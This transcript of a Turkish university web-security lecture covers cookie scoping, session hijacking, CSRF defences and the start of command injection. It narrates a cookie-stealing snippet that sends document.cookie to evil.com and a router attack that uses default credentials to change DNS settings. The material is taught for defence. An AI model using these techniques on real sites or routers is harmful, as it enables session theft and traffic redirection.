Sesim geliyor mu arkadaşlar?
Geliyor hocam.
O zaman şimdi derse başlayalım.
Evet, geçen hafta web üzerinden gelen saldırıları incelemeye başlamıştık.
Önce bir web yapısına baktık.
Sonrasında bu web yapısının şu ana kadar görmüş olduğumuz işletim sistemleriyle benzerliğini ortaya koyduk.
Saldırı modeli nedir? Güvenlik tehdidi modeli nedir? Onları inceledik.
Temel kavramların üzerinden geçtik.
Bugün de doğrudan saldırılara odaklanacağız.
Zaten bugün Fuat hocanız duyuru yaptı.
Bu işlediğimiz konularla alakalı uygulamalara da başlayacaksınız.
Hem bu hafta hem de önümüzdeki, bir sonraki uygulama haftasında bunlarla alakalı uygulamalar.
Şimdi geçen hafta temel olarak üzerinde durduğumuz konulardan bir tanesi same origin polisiydi.
Dokümanlar için nasıl uygulandığına baktık.
Javascript kukiler için kuki tarafında nasıl uygulandığına baktık.
Onların üzerinden geçmiştik hatırlarsanız.
Temel olarak ne demiştik?
Herhangi bir kaynağı alıp kullanabiliyorlar, bize gönderebiliyorlar, browser'a gönderebiliyorlar.
Ancak o kaynağın içeriğine bakılıp bakılmaması same origin polisi üzerinden kontrol ediliyordu.
Yani bir imaj ekranda görüntülenebilir ama o imajın piksellerine doğrudan erişilecek diye bir kural yok.
Bunun yapılıp yapılmayacağı, izin verilip verilmediği tamamı yok.
Buna bağlı olan o yapı üzerinden belirleniyordu.
Bunlar geçen haftaki slide'da konuştuğumuz şeyler.
Javascript'in dinamik olarak yüklenme esnasında istekte bulunabileceği, bu isteklerin de SOP kapsamında kontrol edilmesi gerektiğini konuşmuştuk.
Cross origin resource sharing'den bahsettik.
Aslında burada,
origin neyi ifade ediyordu?
Aynen işletim sistemi güvenliğinde gördüğümüz,
proseslerin farklı kullanıcılar olarak çalıştırılması,
bir kullanıcının diğer bir kullanıcıya ait olan
prosese müdahale edememesi, memurisini okuyamaması, içeriğini görememesi.
Burada da bu origin ile sağlanıyordu.
Ancak belirli şartlar altında,
erişime izin vermemiz gerekiyordu ve
web tarafındaki access control'ü gözden geçirdik.
Hatta burada server gönderdiği içeriğin
hangi originler tarafından incelenebileceği, gösterilebileceği,
üzerinde işlem yapılabileceği yönünde
access control allow origin direktifini kullanarak
birtakım tanımlamalar yapılabiliyordu.
İsteklerin doğrudan gönderilmesi ve bu isteğin
access control allow origin tarafından reddedilmesi
bir sıkıntı olabiliyor.
Onun önüne geçmek için,
browserların pre-flight yani uçuş öncesi anlamına geliyor ya,
uçuştan önce kontrolleri yapalım, her şey yolunda gitsin.
HTTP'deki onları,
HTTP'deki options header'ını kullanarak
serverdan gelecek olan bu access control ile alakalı
izni kontrol ettiklerini, onu test ettiklerini öğrendik.
Böylece içerik gerçek anlamda transfer edilmeden
serverdan bu içeriğin gönderildiği takdirde
okunamayacağı, erişilip erişilemeyeceği
bilgisi gelmiş oluyordu.
Bunu öğrenmiştik.
Kuki tarafında,
hatırlarsanız,
domain ve path üzerine kurulu bir ilişki vardı.
Yani web tarafındaki same origin polisi de
bir parça daha farklı bir şekilde işlem gerçekleştiriliyordu.
Şu örneklerin üzerinden,
işte diyelim ki Kuki Stanford Edu'dan,
bir kez daha geçelim, Stanford Edu'dan geldi.
Domain boş verildi.
Path ise classes olarak verildi.
Domain boş verildiyse bu bir özel durumdu.
Sadece bu Kuki'yi gönderen server'a geri gönderilebilir.
Yani Stanford Edu'ya geri gönderilebilir.
Classes'a kesinlikle gönderilecek.
Classes altındaki CS155'e de gönderilecek.
Çünkü kapsıyor.
Stanford Edu'ya gönderilmeyecek.
Çünkü path kapsamıyor.
Daha üst seviye.
Veya www Stanford Edu'ya gönderilmeyecek.
Çünkü domain alanı az önce söylediğim gibi boş.
Ve ancak Stanford Edu'ya erişilirken gönderilecek.
Bunların üzerinden geçmiştik hatırlarsanız.
Diğer taraftan domain Stanford Edu olarak geldi.
Path boşluk olarak, şey, slash olarak geldi.
Neredeyse her şeyi kapsıyor gibi bir durum.
Buraya gönderilecek.
Çünkü hem host tutuyor hem de path kapsıyor.
Çünkü path kapsıyor.
CS155'te Stanford'ın bir altı.
Ondan dolayı içeriyor.
Yani subdomain'i olduğu için içeriyor.
Ama neyi diliyorduk?
CS155.
CS155 için set edebildiği veya
Stanford için set edebildiği halde
Stanford CS155 için cookie'yi set edemiyordu.
Değil mi?
Bunu domain'e veya path'e göre gerçekleştirebiliyorduk.
İşte aşağıda da slash dediğimiz zaman
o web sitesinin tamamını kapsamış oluyoruz.
Slash login deyip sadece login ve sonrası
bir önceki sayfada gördük.
Gördüklerimizin genel olarak bir tekrarı şeklinde.
Cookie üzerinden yapılan saldırıyı gözden geçirmiştik.
Değil mi?
İşte bakın bu örneği geçen hafta da birebir şey yaptık.
Zakir Stanford password'üyle sayfaya login oluyor.
CS155 login'i okeyliyor ve bir cookie geri döndürüyor.
İsmi session.
İsmi session içeriği abc.
Daha sonra başka bir aynı yerde path'e ulaşmaya çalışıyor.
Oraya ulaşıyor.
Fakat orası aslında
debo Stanford edu.
Fakat içerdiği için oradan da kendisine ne geliyor?
Başka bir cookie daha geliyor.
Bu sefer session-def domain-stanford-edu olarak geliyor.
Çünkü alt üstte set edebiliyor diye hatırlarsanız
az önceki slide'da.
Şimdi biz bir anda aslında CS155 Stanford edu'ya bağlanıp
session-abc cookiesini almışken
oradan yaptığımız bir istek ile bize ne geldi?
Debo Stanford edu'dan başka bir session daha doğrusu başka bir cookie daha geldi.
Bu sefer onun da içeriği session-def şeklinde geldi.
Yani aslında bize gelmemesi gereken bir şey geldi.
Şimdi biz submit ederken hangi cookie'yi submit edeceğiz?
İkisini de submit edebiliriz değil mi?
Fakat elimizde bize ait olmayan aslında kullanmamamız gereken bir cookie de var.
Onu kullandığımız zaman,
Zakir kullanıcısı olarak değil de
işte neydi o, den-debo kullanıcısı, den-boni kullanıcısı olarak görüneceğiz ve
onun üzerinden sisteme login olmuşuz gibi görüneceğiz.
Bu da bir cookie tabanlı saldırı sonuçta.
JavaScript'ten cookie'ye erişebildiğimizi ve başka yere aktarabildiğimizi konuşmuştuk.
Bu da çok ciddi bir sıkıntı.
Yani cookie browser'da, browser'ın kendi içerisindeki özel bir veri tabanında saklanıyor belki ama
JavaScript'le bu cookie'ye eriştiğiniz zaman onu her yere aktarabilirsiniz.
Saldırgan da bu şekilde bunu kendine aktarabilir.
Buna da zaten cookie hırsızlığı, cookie theft diyoruz.
Polisiler koruma amaçlı var.
Bu kurallar koruma amaçlı var ama bazen çakışma oluşuyor.
Ve çakışma olmuştuğu zaman,
o zaman da erişmememiz gereken cookie'lere erişiyoruz.
İşte bakın geçen haftaki örneğimizin birebir aynısı.
Bir iframe oluşturuyoruz.
iframe'in içeriği cs-stanford-edu-deibo.
Bunu iframe'de açıyoruz.
document-body-append-child diyerek.
Daha sonra da iframe'in içinden gidip cookie'yi okuyabiliyoruz.
Çünkü DOM, yani Document Object Model,
o sayfanın bizde, lokalde, browser'da görüntülenen halinde
Same Origin Policy'de pet bilgisi işin içine girmiyor.
Girmediği için de sıkıntı oluyor.
Benzer bir yaklaşımla, neden bahsetmiştik?
Bir bankasınız ve bankanızın,
işte trafiğini ölçmek, değerlendirmek için
Google Analytics'in JavaScript'ini bankanıza ekliyorsunuz.
Fakat o JavaScript çalışırken ne olarak çalışıyor?
Bankaymış gibi, banka orijini ile çalışıyor.
Neden? JavaScript burada yazıyor,
Always runs with the permissions of the window.
Window'un permissions'i aslında ne?
Window'un orijini.
Bakın buraya eğer bir,
kötü niyetli JavaScript yüklendi ise,
bu JavaScript'e,
şurada dikkat edin, Image Source olarak geliyor.
Değil mi?
Ve ne yapıyor?
Evil.com'a bir HTTP request'i gönderiyor ve
orada da cookie eşittir,
document.cookie, document'taki cookie'ye erişiyor.
Yani bu JavaScript farklı bir siteden yüklenmiş olmasına rağmen,
çalışırken ilgili window'un orijinin yetkileriyle,
erişim kontrolü ile çalıştığı için,
cookie'lere erişim hakkı var.
Ve şu görmüş olduğunuz,
https evil.com cookies eşittir,
blabla satırı ile,
cookie'yi aslında evil.com'a göndermiş oluyor.
Buna da cookie theft diyoruz,
cookie'nin çalınması diyoruz.
Bunun önüne geçebilmek için de,
neden bahsetmiştik?
HTTP only cookie'lerden bahsetmiştik.
Bunlar sadece HTTP transferinde alınıp verilen cookie'ler
ve kesinlikle API üzerinden,
JavaScript API'si üzerinden,
document.cookie üzerinden erişilemeyen cookie'ler.
Bu şekilde kısıtlayabiliyoruz demiştik.
Ancak orada da ne vardı?
Trafiği dinleyen bir saldırgan varsa,
bizim bu bank.com ile haberleşmemizin farkına vardığında,
bank.com'un cookie gönderdiğini bildiği için,
sonrasında bizi bir şekilde tekrar bank.com'a bağlanmaya zorluyor.
Bizim browser'ımız bank.com'a bağlandığını düşünürken,
aslında saldırganın,
network üzerinden kontrol ettiği bir siteye bağlanıyoruz.
Ve browser bir HTTP request'te bulunduğu için,
o request'in içerisinde gitmemesi gereken,
açıklanmaması gereken cookie de açıklanıyor.
Yani HTTP only özelliği etkisiz hale geliyor.
Fakat tabii saldırgan bunu sadece şifresiz
HTTP haberleşmesi için yapabiliyor.
Sertifikalar elinde olmadığı için,
HTTPS için yapamıyor.
Bunun önüne geçmek için de uygulanan şey,
Secure Cookie.
Secure Cookie'de cookie'nin özelliğine diyoruz ki,
bu cookie sadece ve sadece arada HTTPS bağlantısı varsa,
geçerli olacak bir şey,
alınıp verilecek, gönderilecek bir cookie'dir.
HTTPS bağlantısı varsa sen bu cookie'yi gönderme.
Bu da bir önceki senaryonun önüne geçmek için.
Ama sonuçta hatırlarsanız,
dersin başında ilk konuştuğumuz konulardan bir tanesi,
kontrol hijack'ti.
Kontrolün ele geçirilmesiydi.
Bir sunucuyu veyahut da bir uç kullanıcıyı,
onun işletim sistemini ele geçiriyorduk.
İşte buffer over flow yaparak,
ele geçiriyorduk.
Ve sonra kendi amaçlarımız için kullanıyorduk.
Onu bir bot haline dönüştürüyorduk.
Ona nasıl kontrol hijack deniyorsa,
burada da cookie'lerin ele geçirilip,
bu cookie'lerin kötü niyetli olarak kullanılmasına,
Session Hijack diyoruz.
Ve bu tarz saldırılara da Session Hijacking Attacks diyoruz.
İster network'ü dinlemeyle gerçekleşsin bu,
ister kötü niyetli bir JavaScript kodunun çalıştırılmasıyla gerçekleşsin,
ne olursa olsun,
böyle veya böyle,
bu Session Hijack olarak tariflenir.
Şimdi, Session Hijack'e,
yani Session'ın ele geçirilmesine yönelik,
saldırıların üzerinden geçeceğiz,
adım adım.
Bu saldırılardan ilk göreceğimiz,
Cross Site Request Forgery.
Bugün bu saldırılarla alakalı ben size,
ayrıntılı bilgiyi vereceğim.
Ama bunlarla alakalı uygulama yapılırken,
Fuat hocamız da bir kez daha,
daha iyi pekişmesi, daha iyi anlamamız adına,
bu ayrıntıların üzerinden tekrar geçecek.
Şimdi, Cross Site Request Forgery ne demek?
Önce onu bir anlayalım.
Bir web uygulaması var.
Bu web uygulamasının güvendiği bir kullanıcı var.
Neden?
O kullanıcı daha önceden login olmuş,
kendi bilgisini belirtmiş,
yani otantikasyon gerçekleşmiş,
kullanıcıyı web uygulaması tanıyor ve
bunun karşılığında da bir cookie göndermiş.
Bundan sonraki isteklerde,
bu cookie'nin gönderilmesi yeterli.
İşte bu cookie'nin ele geçirilerek,
web uygulamasına,
o kullanıcıymış gibi,
kullanıcının farkında olmadığı ve
aslında yapmak istemediği isteklerin,
gönderilmesini tetiklemek.
Bunları sağlamak.
İkinci cümleyi okuyalım, bakın.
Yine CSRF attack,
a user is tricked into submitting an unintended,
niyeti olmadığı,
often unrealized,
çoğunlukla da farkına varmadığı,
web request to a website.
Bir web site'ına yani bir web application'a
böyle bir istek gönderiyor.
Ve bu cookie ile beraber gönderildiği için,
oradaki web uygulaması,
bunun geçerli bir istek olduğunu kabul ettiğinden gerçekleştiriyor.
Ancak eğer bu istek,
ilgili web uygulamasında bir durum değişikliğine sebep oluyorsa,
mesela bir para transfer edilmesi,
veya bir harcama yapılması,
veya bir konfigürasyon değişikliğinin gerçekleştirilmesi,
bunların hepsine biz side effect diyoruz,
yan efekt.
Yani bir transaction okuma yönündedir,
sistemde bir değişiklik yok.
O değeri okursunuz,
sistem öncesinde de aynıdır,
sonrasında da aynıdır.
Ama delete yaparsınız,
insert yaparsınız,
update yaparsınız,
o zaman bir değişiklik gerçekleştirmiş olursunuz.
Bu da bir side effect anlamına gelir.
Yani transaction tamamlandığında,
bu transaction'ın tamamlandığı sistem,
öncesine göre değişmiş bir durumda olabilir.
Bu tarz bir transaction'da,
böyle bir
saldırı ile gerçekleştirilirse eğer bu tarz bir transaction,
bu durum değişikliğine ve bu durumun da kötü sonuçlar doğurmasına sebep olabiliyor.
O yüzden diyoruz ki,
eğer bir transaction'ımız varsa,
biz bunu bir web sitesinde gerçekleştireceksek,
bir web uygulamasında gerçekleştireceksek,
tek başına cookie tabanlı authentication yeterli değil.
Çünkü cookie çalınabilir.
Cookie'nin çalınması,
cross site request forgery,
bu gerçekleştiğinde de,
transaction server tarafından geçerli bir kullanıcıdan geldiği düşünüldüğü için,
başka herhangi bir kontrole ihtiyaç duymadan yapılacak,
sonuçlandırılacak ve belki para eksilecek,
belki para transfer olacak,
belki harcama yapılacak,
satın alma olacak,
belki bir konfigürasyon değişikliği gerçekleşecek.
O yüzden tek başına cookie üzerine kurulu bir authentication kurulmaması lazım.
Bu çok çok önemli.
Cookie'ler authentication için tek başlarına yeterli değiller.
Başka mekanizmalarda bunları desteklememiz lazım,
bu yapıyı desteklememiz lazım ki,
cross site request forgery saldırısına uğramıyor.
Şimdi,
buradaki sıkıntıyı tekrar vurgulamak istiyorum.
Bunun önemini tekrar vurgulamak istiyorum.
En kritik noktalardan biri.
Bunu iyi bir şekilde anlamanız lazım.
Web,
stateless bir protokol.
Ancak bu bizim işimize gelmiyor.
Bir oturum, bir session oluşturmak istiyoruz.
Client olarak bağlandığımız için,
bu server'ın daha önceden bizi authentique ettiğini ve
sonraki isteklerimizin de bu authentikasyon üzerine geldiğini,
böylece her isteği gönderirken bir
authentikasyondan geçmememiz durumu oluşsun istiyoruz.
Böyle bir akıcılık olsun arada,
süreklilik olsun istiyoruz.
O yüzden de cookie'leri kullanıyoruz.
Ancak cookie'ler,
öğrendik.
Eğer domain ve pet tutuyorsa,
ilgili özellikler tutuyorsa,
her istekte gönderiliyor.
İster authentique olunmuş olsun,
ister olunmamış olsun.
Yani şöyle düşünün.
Önce login aşamasından geçtik.
Server bize cookie geri döndürdü.
Tamam, server artık bizi authentique etti.
Sonra biz o uygulamadan çıktık.
Üç gün, beş gün, on gün sonra geri döndük.
Daha hiçbir authentikasyonumuz olmadan,
cookie bizde olduğu için
ve bu cookie geçerli olduğu için,
bu cookie de bizim orada
authentique olduğumuzu gösterdiği için,
aynı web sitesine,
işte on gün sonra geri döndüğümde,
bana bir kullanıcı adı veya şifre sorulmayacak,
ben doğrudan kaldığım yerden devam edeceğim.
Halbuki belki arada bir şeyler değişti.
Belki o cookieyi gönderen ben değilim.
Bir saldırıya uğradım.
Bir sürü şey var.
O yüzden bir isteğin
authentic olup olmadığını,
yani gerçek göndermesi,
gereken göndermesini beklediğimiz
varlıktan gelip gelmediğini
netleştirmek için,
bunu kontrol etmek için,
cookielerle beraber,
başka mekanizmalara da,
onlarla beraber kullanacağımız
başka mekanizmalara da ihtiyaç duyuyoruz.
Dört tane mekanizma var.
Bunları bir arada kullanmak
her zaman için çok daha iyi.
Çünkü hep ne diyoruz?
Hattı müdafaa değil,
sattığı müdafaa.
Bunlar birbirlerini tamamlayan mekanizmalar.
Şimdi göreceğiz.
Bir tanesini kullandım, rahatım
demek ile olmaz.
Hepsini kullanmak,
işi daha da garantiye alacak.
Bunlar neler?
Referrer Validation,
Secret Validation Token,
Custom HTTP Header ve
Same Site Cookie.
Şimdi Referrer Validation ne demek?
Referrer,
bize bir sayfaya
hangi sunucunun yönlendirdiğini söylüyor.
Örneğin Google'da bir arama yaptınız,
arama sonuçları çıktı
ve siz orada ilgili linke tıklayıp
aramanızla alakalı siteye gittiniz.
O zaman oraya gönderilen
web isteğinin içerisindeki
header alanında
referrer bilgisi
Google olarak görünecek.
Çünkü neden?
Google'dan bu bilgi sağlandı.
Siz de ona tıklayıp
ilgili siteye gittiniz.
Referrer bu işe yarıyor.
Ama diyelim ki browserınızı açtınız,
orada location bar,
URL bara gittiniz
ve adresi kendiniz biliyorsunuz.
Doğrudan oraya adresi yazıp enter'a bastınız.
Referrer sizsiniz.
Siz bir server olmadığınıza göre,
bir uygulama olmadığınıza göre
referrer alanı böyle bir istekte
ne olarak gönderilecek?
Boş olarak gönderilecek.
Öyleyse bu bilgi dahilinde,
bu anlattıklarım dahilinde
düşünecek olursak,
bank.com'a gelen bir istek
yine bank.com'dan geliyorsa
uygundur.
Çünkü application'ın kendisi
diyelim ki
önce kullanıcıya bir form göndermiştir.
Kullanıcı bu formu doldurup
submit etmiştir,
geri yollamıştır.
Yani uygulamadaki bir adımdan
bir başka adıma geçilmiştir.
Ama bank.com'a gelen isteğin
referrer alanında
attacker.com yazıyorsa
o zaman bu kabul edilebilir bir durum değildir.
Üçüncüsü de az önce söylediğim
location bar'a siz kendiniz yazdınız.
Orada referrer yok.
Şimdi ne yapılacak?
Demek ki referrer validation
referrer alanının boş gelmemesi durumunda
bizi koruyan bir şey.
Ama referrer alanının boş gelmesi
de söz konusu.
Ancak boş geldiğinde
iyi bir durum mu kötü bir durum mu
bunun kararının verilmesi lazım.
Bunun için neden yararlanıyoruz?
Secret token validation'dan yararlanıyoruz.
Secret token ne?
Server'la
server'ın browser'a gönderdiği
bir form arasında
o formun işlenmesi sırasında
sadece server'ın bileceği bir
özel anahtarın kullanılması
özel değerin kullanılması.
HTML formlarında
tipe hidden yani saklı gizli olan
alanlar var.
Bu alanlar ekranda görüntülenmiyor.
Ancak formla beraber geliyor
browser'a formla beraber gidiyor
server'a.
Şimdi bakın bunların içerisine ne
yerleştiriyoruz?
Server tarafından içeriği oluşturulmuş bir
token değeri.
Name CSRF token denilmiş
value da şurada yazan değer.
Saldırgan bu değeri elde edemediği sürece
browser'a göndereceği
isteklerdeki referer alanını
düzgün ayarlamayı başarsa bile
yani diyelim ki
hala da bank.com olarak görünüyor
orası attacker görünmüyor.
O aşamayı atlatmış olsa da
server yerleştirmiş olduğu token'ın
değerini kontrol edip
doğruluğuna bakacağı için
isteğin gerçekten kendisinden mi
kaynaklandığını yoksa bir saldırıdan mı
kaynaklandığını tespit edebilir.
Şimdi burada kritik olan değer
bu token'ın, bu secret token'ın
statik olmaması.
Çünkü neden?
Saldırgan
bu token'ın statik olduğunu fark ederse
offline olarak yani
bize yaptığı bir saldırının
parçası olarak değil ayrıca
bağımsız bankaya
yapacağı bir girişimle
bankanın
o sayfa için token değeri olarak
hangi değeri kullandığını ve bu değere
hangi ismi verdiğini öğrenebilir.
İşte burada name ve value.
Artık bundan sonra
yapacağı saldırılarda da
aynı isim ve aynı değeri kullanabilir.
Öyleyse
token'ın session spesifik olması lazım.
Yani bundan ne diyoruz?
O sayfadan ben ayrıldım
üç gün beş gün sonra tekrar geri döndüm
aynı sayfaya.
O zaman bu token değeri tekrar üretilmeli.
Tekrar üretilmeli.
Yani bir nevi neye benziyor arkadaşlar?
Bu kanari değerinin statik olmaması
kanari değerinin her proses için
proses başlatılırken yeniden üretilmesi
yoksa orada da hani kanari extraction yapıyorduk ya
burada da bunun out of band
offline olarak değerinin tespit edilmesi
bir extraction işlemi.
O zaman buraya koyacağımız token'ın bir anlamı kalmıyor.
Demek ki o sayfaya
erişildiğinde
kullanıcı
session bilgisi verse bile
sayfa yeniden erişildiği için
sayfaya yeniden bir
erişimle yükleme yapılacağı için lokalde
o
browser'a o bilgi aktarılacağı için
token değeri tekrar üretilmeli.
Böylece saldırganın
o token değerini
tahmin edebilme
veya bulabilme
yani tahmin edebilmeyi kenara koyalım
o zaten kriptografik üretildi ve
burada gördüğünüz gibi uzun bir değer olduğu için
computation olarak zorlaştırılmış bir şey
ama bulabilme ihtimalini ortadan kaldırıyor.
Şimdi preflight'ın ne olduğunu biliyoruz değil mi?
Cross-origin resource sharing'te
işte server bize bu content'i
şu domain'ler, şu origin'ler okuyabilir
diye bir şey geri döndürüyordu.
Ona göre gerçek get veya post'u
yapıyorduk.
Şimdi normalde
get veya post'lar
basitse
preflight yapmıyorduk.
Hani orada belirli bir zorluk derecesinin
üzerinde olmalı ki bunu yapmalıyız
diyorduk.
Bu arada get veya post
sadece browser'da
bir şeylere tıklamamızla
bir form'u submit etmemizle
bir request oluşturmamızla
gerçekleşmiyordu. Aynı zamanda
aktif olarak javascript çalışıyor.
Javascript'te xml http request ile
bu get veya post isteğini oluşturabiliyordu.
O zaman ne yapıyoruz?
Şöyle bir hile uyguluyoruz.
xml http request ile beraber
server'a normalde standartta olmayan
ama bizim özel olarak uygulamamıza spesifik
header ekliyoruz.
İşte x requested by
x requested with
Onun da bir değeri oluyor.
Yani sadece bu alanı yazmıyorum.
Onun yanına aynen bu
secret token mantığına uygun olarak
bir değer koyuyor.
Şimdi custom header
kullanılması durumunda
bu yine
implementasyonun bu şekilde
tariflenmesi, endüstri
standardının bu şekilde
belirlenmesinden ötürü
eğer bir xml http request'te
normal header haricinde
custom header kullanacaksam
otomatikman preflight check yapılıyor.
Çünkü standardın dışında bir şey var.
Server buna izin verebilir veya
vermeyebilir.
Artı bu custom header'lar
normal get veya postlarda kullanılmıyor.
xml http request'te kullanılıyor.
Yani zaten saldırgan
saldırısını benim browser üzerinden
neyle yapacak?
Javascript'le yapacak.
Javascript'te neyi kullanacak?
xml http request'ı kullanacak.
Şimdi saldırgan
bu header'ları
içeriğinin ne olacağını
bilemediğinden ötürü
bu header'ların içeriği
dinamik olacağından ötürü
bu header'ların içeriğine bakarak
server
ne yapabiliyor?
access control
allow origin
onayı verebiliyor
veyahut da hayır erişemezsin diye.
Demek ki bakın
böylece
geçen ders öğrendiğimiz
preflight check mantığını
burada cross-site request forgery'e karşı
kendimizi güvence altına
almak için kullanabiliyoruz.
Şimdi son olarak da bu hani
dört başlık vardı ya
same site cookie
cookie'lerin yanına nasıl secure yazıyorsak
bu sadece https üzerinden
gönderilebilir anlamında
secure yazıyorsak
cookie'lerin yanına aynı zamanda
same site'da diyebiliyoruz.
Şimdi bu
browser tarafından yine
incelenip kontrol edilip ona göre
reaksiyon alınan bir durum.
Yoksa hani biz onu oraya yazdık
server'dan o şekilde geldi
sonrasında browser buna göre
davranmazsa bir anlamı olmaz.
Bunlarda neler?
strict mode
artı lex mode
şimdi strict mode'da diyor ki
never send cookie in a
cross-site browsing context
yani cross-site browsing
söz konusu ise tek bir
site değil farklı siteler var ve
bir siteden gelen bir içerikle başlayabiliriz.
Başka bir siteye request
gönderilmesi söz konusu ise
o zaman
bu cookie'yi göndermeyeceksin.
Bakın ilk defa cookie'nin
gönderilmesini
hani o domain ve head
eşleşmesi vardı ya
onun haricinde
bir anahtarla kontrol eder
hale geldik. Hatta ve
hatta bu cookie'yi
normal bildiğimiz bir
http yani html'deki
http linki üzerinden
href
a-href diyoruz ya
referans şeklinde
aktif link üzerinden de
göndermeyeceksin diyoruz.
Örnek
GitHub projesiyle
alakalı bana bir e-mail geliyor
dahil oldu. Ben bu e-mail'deki
proje linkine
tıklıyorum ama
ilgili cookie strict mode'da
olduğu için
browser
o cookie'yi
gitaba
göndermiyor. Ne oluyor?
Projeye erişebilmem
için
GitHub'ın
otantikasyon mekanizmasından
user id password otantikasyon
mekanizmasından
tekrar geçmem lazım arkadaşlar.
Beni tekrar
otantikasyonu zorlamış oldu.
Halbuki strict mode demeseydim
zorlamış olurdum.
Linkle gittiğim için
lex mode
lex relax gibi
rahat biraz daha serbest olan
strict sıkı lex
serbest. Serbest mode'da
olsaydı link üzerinden
gittiğim için o cookie gönderilecekti ve
ben bir anda kendimi
GitHub'da
projenin içerisinde bulacaktım.
Lex mode'un özelliği ne?
Linklere izin veriyor. Linkler
üzerinden
ancak
script üzerinden
yani işte
XML tarzı
XML'de işte
request tarzı script üzerinden
gönderilmelerde
isteğin server'a
gitmesinde o cookie'nin gönderilmesine
izin vermiyor.
Cookie böylece
normal tıklamayla
gidildiğinde
anlam ifade ediyor
ama benim
browser'ıma kötü niyetli bir
javascript yüklendiyse
ve
o javascriptte işte
o siteye erişim yaparken
benim cookie'nin
gönderileceğini bildiği için
onun üzerinden benim
user id ve password'um
yani authentication'ımla işlem
yapacağını planladıysa
bunun önüne geçilmiş olur.
Şimdi durum değişikliğinde
illaki para harcamak
parayı transfer etmek
satın alma yapmak olmak zorunda
değil konfigürasyon
değişikliği de olabilir dedim.
Bunun da özellikle vurguladım hani
site effect başlığı altında
buna da çok dikkat etmeniz lazım.
Şimdi bakın
hepinizin evinde oturduğu
yerde
öyle veya böyle internete
bağlanmanızı sağlayan bir router var.
Değil mi? İşte ADSL
router falan filan.
Bu routerlar
bir
web arayüzü üzerinden konfigür
oluyorlar.
Admin veya benzer bir kullanıcıyla
login oluyoruz.
Çoğu zamanda bu arayüz
sadece ve sadece
ev tarafından
içerideki internet tarafından
erişilebilir olduğu için
orada
sıradan basit üreticiyle
özleştirilmiş
şifre var.
İşte nedir? Diyelim ki
süper online routerlarının
user adresi admin'dir
password'u süper online'dır.
Bunu değiştirmezsiniz
çoğu zaman. Ne gerek var? Zaten
evin içerisinden erişiliyor.
İnternetten bu arayüze erişmeye
ihtimal bile yok.
Şimdi şöyle bir şey düşünün.
Siz o routera
erişmişsiniz. Çok güzel
girmişsiniz.
Router size herhangi bir cookie
falan da bırakmamış.
Zaten öyle bir şey yapmasına
gerek yok. Authentication her seferinde
güvenlikten dolayı sizi zorlayacak.
O yüzden öyle bir şey yapmıyor.
Zaten admin olarak gidiyorsunuz.
Ancak siz internette
dolaşırken
sizin browserınıza kötü niyetli
bir javascript
parçası yüklenme.
Bu javascript parçası
ne yapıyor?
Lokalinizdeki routera
içeriden
dikkat edin browser nerede? İçeride.
İnternetinizde. İnternette
değil içeride.
Lokalinizdeki routera
ilk zaman http request
yaparak
işte nedir bu
admin ve super online
default user id password'ını
kullanıp gireyim.
İlgili
http requestleri ile
o routerdaki
dns sunucusu adresini
değiştireyim.
Niçin? Sizin
bütün isimden
adrese dönüşümlerinizi kendi kontrolü
altına almak için.
Bundan sonra istediği her şeyi yapabilir.
Kopyaladığı
sayfalar varsa görüntü olarak
şekil olarak
ekran olarak neyse
bunları kendi sunucularında host ediyorsa
o zaman siz
bu sayfalara
erişmek için browserınıza isim
yazdığınızda
dönüşen adres gerçekte o sunucuların
sayfa adresi
olmayacak.
Saldırganın yönlendirmek
istediği adres olacak. Çünkü niye
sizin routerınızın
dns sunucusunu kendisi kontrol ediyor.
Dikkat edin routerın dışarıdan
o ekranına erişim yok.
Tamamen kapalı.
Ama dışarıdan yüklenen
bir javascript
browserınızda çalışırken
xml http requestleri
yaparak default user id
ve password'u kullanıp
sizin routerınızı
konfigür etti. Bu da yapılan misaldir.
O zaman demek ki bir siteye
login
olunması dahi bir site efekti.
Yani neden siteye
login olundu? Sitedeki en azından
kullanıcı sayısı değişti. Routerede kimse yoktu.
Bir anda admin kullanıcısı var ve
her türlü şeyi yapabilir.
Bunlara da dikkat etmemiz gerek.
Şimdi
bir sonraki
başlığımız
SQL injection arkadaşlar.
Cross site request forgery
bitirdik. Dediğim gibi
hepsinin uygulamasını yapacaksınız.
Uygulama sırasında tekrar da
bir kez daha anlatılabilir.
Şimdi SQL injection.
SQL injection'a niye önem veriyoruz?
Bakın 2003 listesi
2017 listesi injection en başta.
Hala daha da
ciddi bir sıkıntı.
O yüzden bu kadar ciddi
ve bilindik bir
sıkıntıyı artık yaşamamak için
buradan
bir güvenlik açığı yaşayıp
sonucunda da
kötü bir duruma düşmek
için SQL injection'ı
anlamamız ve
ortadan kaldırmamız gerekiyor.
Çözümü çok basit aslında.
Metodolojik olarak yaklaşmamız lazım.
Şimdi onu göreceğiz.
Bunun öncesinde
SQL injection öncesinde
comment injection nedir onu anlayalım.
Çünkü SQL injection'da
comment injection da kullanılıyor.
İkisi bir arada kullanılıyor.
SQL injection izin verebiliyor mu?
Yani sadece
database'den bir tabloyu
query edip
bir sonuç döndürmek diye düşünmeyin.
Daha felaket, daha kötüsü yapılabiliyor.
O kapının kapalı olması lazım
herhalde.
Comment injection'ın amacı
çok basit.
Mevcut bir komutu
kendi istediğimiz bir başka komutun
çalıştırılması için kullanmak.
Çok anlamsız gibi görünüyor ama
şu örneği gözden geçirdiğimizde
anlayacaksınız.
Şimdi burada headhundred diye bir
uygulama var. Çok basit bir uygulama.
Verilen bir file'ın
ilk 100 satırını ekrana dökecek.
Bunun için Unix'de
head komutu var. İşte
"-n 100 dediğiniz zaman
number of lines demek
"-n". İlk 100 satır.
Ne yapıyor? Komutu oluşturmak
için dinamik olarak bir alan
oluşturuyor. Önce
head-n 100'ü
kopyalıyor. Arkasından
gelen dosyanın adını
kullanıcı tarafından aktarılan
dosyanın adını
deteniyet ediyor. Yani ekliyor.
Şimdi
argv0
çalıştırılan programın adıdır.
Burada headhundred.
argv1 birinci parametredir.
2, 2, 3 üçüncü parametredir.
argc'de argüman
kağıttır. Kaç tane argüman
verildiyse. Sistemde
sistem çağrısı yapmak anlamındadır.
Öyleyse yani sanki
komut satırından head
"-n 100 boşluk
hangi file ise onun adını verip
basmışsınız gibi çalışacak.
Bakın burada
düzgün çalışma hali. Şurada
head 10 yazılmış, head 100 olacak o.
Ona takılmayın. Aynı
dosya. Bir sıfır unutulmuş.
headhundred myfile.txt
dediğimizde
sistem head
"-n 100 myfile.txt
çalıştırılıyor.
Şey bu. Bu kadar basit.
Şimdi bakın
shell'in özelliği, commandline'in
özelliği birden fazla
komutu tek satırda yazıp
